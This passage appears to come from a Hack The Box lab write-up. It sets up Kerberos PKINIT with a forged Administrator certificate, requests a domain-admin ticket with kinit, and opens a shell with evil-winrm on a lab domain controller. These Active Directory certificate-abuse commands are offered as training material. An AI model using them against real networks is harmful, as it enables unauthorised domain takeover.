Depending on the Kali setup, you may need to install additional packages in order to configure Kerberos for PKINIT (for example, krb5-user and krb5-pkinit packages on Debian-based systems). Edit the /etc/krb5.conf file as follows:

```bash
[libdefaults] 
	default_realm = WINDCORP.HTB 

[realms] 
	WINDCORP.HTB = { 
		kdc = earth.windcorp.htb 
		admin_server = earth.windcorp.htb 
		pkinit_anchors = FILE:/tmp/anubis/ca.cer 
		pkinit_identites = FILE:/tmp/anubis/admin.cer,/tmp/anubis/admin.key 
		pkinit_kdc_hostname = earth.windcorp.htb 
		pkinit_eku_checking = kpServerAuth 
	} 
[domain_realm] 
	.windcorp.htb = WINDCORP.HTB 
	windcorp.htb = WINDCORP.HTB
```

Add an entry for earth.windcorp.htb to our /etc/hosts file:

```bash
echo "172.20.48.1 earth.windcorp.htb" | sudo tee -a /etc/hosts
```

Move to the temp directory and run kinit to request a ticket:
```bash
cd /tmp/anubis; proxychains kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@WINDCORP.HTB
```

Verify our ticket with `klist`.

Use evil-winrm or psexec to obtain an interactive shell as Administrator
```bash
evil-winrm -i earth.windcorp.htb -u administrator -r WINDCORP.HTB
```
References: https://posts.specterops.io/certified-pre-owned-d95910965cd2